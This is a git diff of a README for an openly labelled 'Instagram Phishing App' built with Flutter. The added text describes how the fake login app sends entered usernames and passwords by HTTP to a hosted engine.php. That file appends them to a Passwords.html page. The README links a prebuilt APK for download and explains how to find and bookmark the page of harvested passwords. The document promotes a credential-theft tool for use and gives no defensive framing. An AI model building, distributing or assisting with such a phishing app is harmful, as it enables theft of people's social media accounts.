@@ -1,16 +1,29 @@
-# instagram
+# Instagram Phishing App
 
 A Social Media clone app
 
-## Getting Started
+## About
 
-This project is a starting point for a Flutter application.
+This project is a starting point for a Flutter based Instagram Phishing App.
 
-A few resources to get you started if this is your first Flutter project:
+## Structure
+    The hosting_backend/engine.php file recieves the pinged username and password from flutter http request and appends it to an Styled Html file named Passwords.html
 
-- [Lab: Write your first Flutter app](https://flutter.dev/docs/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://flutter.dev/docs/cookbook)
+## Dependencies
+    - http:
+    - flutter_launcher_icons:
 
-For help getting started with Flutter, view our
-[online documentation](https://flutter.dev/docs), which offers tutorials,
-samples, guidance on mobile development, and a full API reference.
+## Run the project
+- With Flutter installed, clone project and run `flutter run --release` in that directory,
+or
+- Download the built APK from [here](https://github.com/brijrajparmar27/Flutter-Instagram-phishing-app/raw/master/github_assets/app-release.apk)
+
+## Accessing the saved passwords
+    Visit your hosting site and navigate to the directory where the engine.php file has been placed, there you'll find a generated Passwords.html file, if you wanna frequently check the passwords you can create and webview or bookmark the link.
+
+## Screenshots
+<img src="github_assets/preview.gif" height="800">
+<img src="github_assets/pass.PNG" height="800">
+
+Feedback is welcome! Contact me for any info.
+made with ❤ by brijrajsinh parmar
